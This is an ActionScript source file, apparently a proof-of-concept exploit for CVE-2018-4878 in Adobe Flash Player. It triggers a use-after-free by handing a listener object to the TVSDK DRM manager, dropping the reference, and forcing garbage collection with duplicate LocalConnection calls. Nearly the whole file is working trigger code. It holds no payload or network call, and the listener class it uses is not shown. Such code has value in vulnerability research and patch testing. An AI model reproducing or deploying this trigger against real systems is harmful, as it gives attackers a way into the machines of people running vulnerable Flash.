package Poc
{
	import flash.display.FrameLabel;
	import flash.display.Sprite;
	import flash.events.Event;
	import com.adobe.tvsdk.mediacore.*;
	import flash.events.TimerEvent;
	import flash.net.LocalConnection;
	import flash.utils.ByteArray;
	import flash.external.ExternalInterface;
	import flash.utils.Timer;
	import flash.text.TextField;
	
	/**
	 * ...
	 * @author 五千年木
	 */
	public class Main extends Sprite 
	{
		var danglingpointer :MyListener = null;
		var mediaplayer :MediaPlayer = null;
		var listener :MyListener = null;
		var timer :Timer = null;

		// Used to trigger UAF
		public function triggeruaf() : void {
			var sdk :PSDK = null;
			var dispatch:PSDKEventDispatcher = null;

			sdk = PSDK.pSDK;
			dispatch = sdk.createDispatcher();

			this.mediaplayer = sdk.createMediaPlayer(dispatch);
			this.listener = new MyListener();
			this.mediaplayer.drmManager.initialize(this.listener);
			this.listener = null;
		}
		
		
		public function exploit():void {
			
			this.triggeruaf();
			
			try {
				new LocalConnection().connect("test");
				new LocalConnection().connect("test");
			} catch (e:Error) {
			}
		}
		
		
		public function Main() 
		{
			if (stage) init();
			else addEventListener(Event.ADDED_TO_STAGE, init);
		}
		
		private var log :TextField = new TextField();
		public function AddToLog(text :String) : void {
			this.log.text += "\n" + text;
		}
		private function init(e:Event = null):void 
		{
			removeEventListener(Event.ADDED_TO_STAGE, init);
			// entry point
			this.log.width = 400;
			this.log.height = 1500;
			this.log.x = 0;
			this.log.y = 0;
			this.addChild(this.log);
			
			AddToLog("CVE-2018-4878 POC, by 五千年木\n");
			
			exploit();
			return;
		}
		
	}
	
}